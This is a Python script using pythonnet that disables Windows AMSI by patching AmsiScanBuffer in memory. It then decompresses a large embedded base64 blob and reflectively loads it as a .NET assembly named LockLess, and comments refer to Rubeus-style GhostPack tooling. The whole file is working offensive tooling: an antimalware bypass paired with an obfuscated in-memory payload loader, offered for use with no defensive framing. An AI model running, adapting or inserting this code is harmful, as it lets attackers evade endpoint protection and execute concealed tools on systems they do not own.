import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("LockLess.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()